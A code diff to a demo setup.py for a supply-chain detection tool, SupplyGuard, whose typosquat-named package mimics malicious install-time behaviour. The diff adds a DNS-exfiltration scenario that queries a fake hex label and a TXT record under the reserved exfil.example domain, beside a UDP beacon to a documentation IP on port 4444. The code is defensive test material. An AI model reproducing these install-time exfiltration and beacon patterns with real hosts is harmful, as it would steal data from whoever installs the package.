@@ -14,7 +14,7 @@ pip 이 이 setup.py 를 실행하는 순간, 커널의 openat/execve/connect �
     sg-install pip ./deploy/demo/reqeusts
 
 시나리오는 SG_DEMO_SCENARIOS 로 고른다(쉼표 구분, 기본 all, 기존 순서 유지):
-    SG_DEMO_SCENARIOS=all | shell | revshell | direct-ip | domain | udp
+    SG_DEMO_SCENARIOS=all | shell | revshell | direct-ip | domain | dns-exfil | udp
 각 시나리오는 시작 전에 "[demo] <id> start" 를 찍어 로그로 시각을 맞출 수 있게 한다.
 """
 import os
@@ -77,11 +77,47 @@ def scn_domain():
         print(f"[demo]   example.com:443 {e.__class__.__name__}")
 
 
+def scn_dns_exfil():
+    # DNS 질의로 데이터를 실어 보내는 패턴 흉내 — 48자 hex 라벨을 예약 TLD(.example, RFC 2606) 아래로 조회.
+    # 예약 TLD 라 NXDOMAIN 이고 아무 데이터도 나가지 않는다. 이어서 TXT 질의 1개를 컨테이너의 네임서버로 보낸다.
+    # runtime-dns-exfil(라벨 40자 초과 · TXT) / sandbox-dns(허용 목록 밖 도메인) 시연용.
+    print("[demo] dns-exfil start")
+    label = "deadbeef" * 6  # 48자 — 유출 데이터를 흉내 낸 가짜 hex
+    name = f"{label}.exfil.example"
+    try:
+        socket.getaddrinfo(name, 443)
+        print(f"[demo]   resolved {name} (unexpected)")
+    except OSError as e:
+        print(f"[demo]   dns query {name} -> {e.__class__.__name__} (NXDOMAIN expected, harmless)")
+    ns = "127.0.0.11"
+    try:
+        with open("/etc/resolv.conf") as f:
+            for line in f:
+                if line.startswith("nameserver"):
+                    ns = line.split()[1]
+                    break
+    except OSError:
+        pass
+    # TXT 질의 1개(RFC 1035 와이어 포맷): id 0x1337 · RD · QNAME data.exfil.example · QTYPE TXT · QCLASS IN
+    q = (b"\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+         b"\x04data\x05exfil\x07example\x00\x00\x10\x00\x01")
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.settimeout(1)
+        s.sendto(q, (ns, 53))
+        s.recv(512)
+    except OSError as e:
+        print(f"[demo]   txt query data.exfil.example -> {ns}:53 {e.__class__.__name__}")
+    finally:
+        s.close()
+    print("[demo]   txt query data.exfil.example sent (harmless, reserved TLD)")
+
+
 def scn_udp():
     # UDP 비컨 — 203.0.113.7:53·4444 로 데이터그램 2개 전송(응답 기다리지 않음).
-    # 현재 엔진은 TCP 만 관찰하므로 이 시나리오는 "보이지 않는" 음성 대조군이다 — 이벤트에 뜨지 않아야 정상.
+    # 엔진은 TCP 와 DNS(53 · 5353)만 관찰 — 일반 UDP 는 보이지 않는 음성 대조군. 이벤트에 뜨지 않아야 정상.
     print("[demo] udp start")
-    print("[demo]   NEGATIVE CONTROL: UDP 는 TCP-only 엔진에 보이지 않는다 (이벤트 미탐이 정상)")
+    print("[demo]   NEGATIVE CONTROL: 일반 UDP 는 엔진에 보이지 않는다 — TCP 와 DNS(53 · 5353)만 관찰 (이벤트 미탐이 정상)")
     for port in (53, 4444):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -97,6 +133,7 @@ SCENARIOS = [
     ("revshell", scn_revshell),
     ("direct-ip", scn_direct_ip),
     ("domain", scn_domain),
+    ("dns-exfil", scn_dns_exfil),
     ("udp", scn_udp),
 ]
 
@@ -113,7 +150,7 @@ def main():
             ran = True
     if not ran:
         print(f"[demo] no matching scenario in SG_DEMO_SCENARIOS={want!r} "
-              "(use all|shell|revshell|direct-ip|domain|udp)")
+              "(use all|shell|revshell|direct-ip|domain|dns-exfil|udp)")
         return
     print("[demo] done — 정상 설치라면 여기 도달하지만, SupplyGuard 는 shell 시나리오에서 이미 격리한다.")
 
